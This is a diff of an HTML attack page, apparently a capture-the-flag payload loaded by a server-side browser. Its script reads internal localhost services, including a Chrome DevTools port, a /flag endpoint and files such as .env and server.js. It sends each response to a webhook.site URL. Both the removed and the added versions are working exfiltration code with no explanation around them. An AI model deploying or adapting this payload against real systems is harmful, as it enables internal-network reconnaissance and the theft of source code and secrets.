@@ -1,55 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Scanner</title>
+    <title>Express Exploit & Source Leaker</title>
     <style>
-        iframe { width: 100%; height: 250px; border: 2px solid red; margin-bottom: 10px; }
+        body { font-family: monospace; padding: 10px; }
+        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; }
     </style>
 </head>
 <body>
-    <h2>Internal Extraction in Progress...</h2>
-    <div id="log"></div>
+    <h2>Express Route & Source Analysis</h2>
+    <div id="results"></div>
 
     <script>
         const webhook = 'https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427';
 
-        // 1. Check for Chrome DevTools Protocol (CDP) on port 9222
-        fetch('http://127.0.0.1:9222/json/version')
-            .then(res => res.json())
-            .then(data => {
-                fetch(webhook + '?cdp_version=' + encodeURIComponent(JSON.stringify(data)));
-            }).catch(e => {});
+        // Helper to log and exfiltrate results
+        function logResult(title, data) {
+            const div = document.createElement('div');
+            div.innerHTML = `<h3>${title}</h3><pre>${escapeHtml(data)}</pre>`;
+            document.getElementById('results').appendChild(div);
+            
+            fetch(webhook + '?title=' + encodeURIComponent(title) + '&data=' + encodeURIComponent(data.substring(0, 1000)))
+                .catch(e => {});
+        }
 
-        fetch('http://127.0.0.1:9222/json/list')
-            .then(res => res.json())
-            .then(data => {
-                fetch(webhook + '?cdp_list=' + encodeURIComponent(JSON.stringify(data)));
-            }).catch(e => {});
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
 
-        // 2. Scan common ports and paths
-        const ports = [3000, 5000, 8080, 80, 9222, 1337, 31326];
-        const paths = ['', '/flag', '/flag.txt', '/admin', '/api', '/debug'];
+        // 1. Test POST request to /flag
+        fetch('http://127.0.0.1:31326/flag', { method: 'POST' })
+            .then(res => res.text())
+            .then(data => logResult('POST /flag Response', data))
+            .catch(err => logResult('POST /flag Error', err.toString()));
 
-        ports.forEach(port => {
-            paths.forEach(path => {
-                const target = `http://127.0.0.1:${port}${path}`;
-                
-                // Try fetching data
-                fetch(target)
-                    .then(r => r.text())
-                    .then(text => {
-                        if (text && text.length > 0) {
-                            fetch(webhook + '?found=' + encodeURIComponent(target) + '&body=' + encodeURIComponent(text.substring(0, 400)));
-                        }
-                    }).catch(err => {});
+        // 2. Try fetching common source code files / configs
+        const targets = [
+            '/package.json',
+            '/index.js',
+            '/server.js',
+            '/app.js',
+            '/src/index.js',
+            '/.env'
+        ];
 
-                // Embed iframes for direct PDF rendering of main targets
-                if (path === '' || path === '/flag' || path === '/flag.txt') {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = target;
-                    document.body.appendChild(iframe);
-                }
-            });
+        targets.forEach(path => {
+            fetch('http://127.0.0.1:31326' + path)
+                .then(res => {
+                    if (res.ok) return res.text();
+                    throw new Error('Status: ' + res.status);
+                })
+                .then(data => logResult('File: ' + path, data))
+                .catch(err => {});
         });
     </script>
 </body>
